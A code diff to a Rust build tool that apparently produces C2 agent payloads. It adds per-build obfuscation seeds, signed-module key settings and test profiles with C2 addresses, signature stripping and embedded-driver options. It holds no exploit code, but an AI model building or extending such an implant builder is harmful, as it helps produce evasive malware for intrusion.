@@ -39,7 +39,7 @@ pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) 
     let seed_hex = format!("{:016x}", seed);
     info!(seed = %seed_hex, "Build diversification seed");
     extra_env.push(("OPTIMIZER_STUB_SEED".into(), seed_hex.clone()));
-    extra_env.push(("CODE_TRANSFORM_SEED".into(), seed.to_string()));
+    extra_env.push(("CODE_TRANSFORM_SEED".into(), seed_hex));
 
     info!(target_triple = %triple, package, bin = %bin_name, "Building agent payload");
     let bin_path = cargo_build(package, bin_name, &triple, &effective_features, &extra_env)?;
@@ -164,6 +164,15 @@ pub(crate) fn build_time_env(
     if let Some(ref module_key) = cfg.module_aes_key {
         if !module_key.trim().is_empty() {
             extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
+        }
+    }
+
+    // Bake in the module verify key when provided so the agent verifies
+    // signed modules against the server's signing key instead of falling back
+    // to the compile-time MODULE_SIGNING_PUBKEY constant.
+    if let Some(ref verify_key) = cfg.module_verify_key {
+        if !verify_key.trim().is_empty() {
+            extra_env.push(("ORCHESTRA_MODULE_VERIFY_KEY".into(), verify_key.clone()));
         }
     }
 
@@ -437,29 +446,19 @@ fn host_triple() -> Option<String> {
         .find_map(|line| line.strip_prefix("host: ").map(str::to_owned))
 }
 
-/// Generate a random `u64` seed using OS entropy.
+/// Generate a random `u64` seed.
 ///
-/// Reads 8 bytes from `/dev/urandom` on Unix or uses `rand` crate on other
-/// platforms.  Falls back to a time+pid hash only if the OS source is
-/// unavailable.
+/// Primary path: `rand::RngCore` (available on all platforms).
+/// Secondary path (Unix only): read 8 bytes from `/dev/urandom`.
+/// Last resort: mix time and PID (predictable — only used when both
+/// primary and secondary paths fail).
 fn generate_random_seed() -> u64 {
-    #[cfg(unix)]
-    {
-        use std::io::Read;
-        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
-            let mut buf = [0u8; 8];
-            if f.read_exact(&mut buf).is_ok() {
-                return u64::from_le_bytes(buf);
-            }
-        }
-    }
-    // Fallback: mix time and PID.
-    let now = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_nanos() as u64;
-    let pid = std::process::id() as u64;
-    now ^ pid.wrapping_mul(0x9E3779B97F4A7C15)
+    // Primary: use the rand crate (available on all platforms).
+    // rand::thread_rng().next_u64() draws from the OS CSPRNG and does not
+    // panic in practice, so we call it directly without catch_unwind.
+    use rand::RngCore;
+    let mut rng = rand::thread_rng();
+    rng.next_u64()
 }
 
 #[cfg(test)]
@@ -483,7 +482,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "127.0.0.1:8444".to_string(),
             encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
-            hmac_key: None,
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: Some("0".repeat(64)),
             features: vec!["embedded_driver".to_string()],
@@ -503,6 +501,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path,
         }
     }
@@ -562,7 +561,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "127.0.0.1:8444".to_string(),
             encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
-            hmac_key: None,
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: Some("0".repeat(64)),
             features: vec!["outbound-c".to_string()],
@@ -582,6 +580,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
 
@@ -599,7 +598,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "c2.example.com:8446".to_string(),
             encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
-            hmac_key: None,
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: Some("0".repeat(64)),
             features: vec!["outbound-c".to_string(), "http-transport".to_string()],
@@ -623,6 +621,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
 
@@ -646,7 +645,6 @@ mod tests {
             target_arch: "x86_64".to_string(),
             c2_address: "ssh.example.com:22".to_string(),
             encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
-            hmac_key: None,
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: Some("0".repeat(64)),
             features: vec!["outbound-c".to_string(), "ssh-transport".to_string()],
@@ -666,6 +664,7 @@ mod tests {
             strip_signature: true,
             strip_debug: true,
             module_aes_key: None,
+            module_verify_key: None,
             driver_path: None,
         };
 
